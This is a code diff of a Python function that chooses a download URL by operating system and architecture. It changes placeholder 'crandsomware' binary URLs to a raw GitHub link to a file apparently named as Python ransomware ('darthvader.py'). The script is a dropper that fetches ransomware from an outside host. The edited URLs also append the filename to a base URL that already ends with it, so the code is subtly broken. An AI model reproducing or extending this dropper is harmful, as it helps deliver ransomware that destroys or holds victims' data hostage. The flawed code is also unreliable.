@@ -9,18 +9,18 @@ def get_system_info():
     return system, arch
 
 def download_executable(system, arch):
-    base_url = "https://example.com/crandsomware/"
+    base_url = "https://raw.githubusercontent.com/SergioZ3R0/Sergio-Code/refs/heads/master/cyberSec/pythonRandsomware/darthvader.py"
     if system == "Linux":
         if arch == "x86_64":
-            url = base_url + "voldemort_linux_x86_64"
+            url = base_url + "darthvader.py"
         elif arch == "aarch64":
-            url = base_url + "voldemort_linux_aarch64"
+            url = base_url + "darthvader.py"
         else:
             raise ValueError("Unsupported architecture")
     elif system == "Windows":
-        url = base_url + "voldemort_windows.exe"
+        url = base_url + "darthvader.py"
     elif system == "Darwin":
-        url = base_url + "voldemort_macos"
+        url = base_url + "darthvader.py"
     else:
         raise ValueError("Unsupported operating system")
 
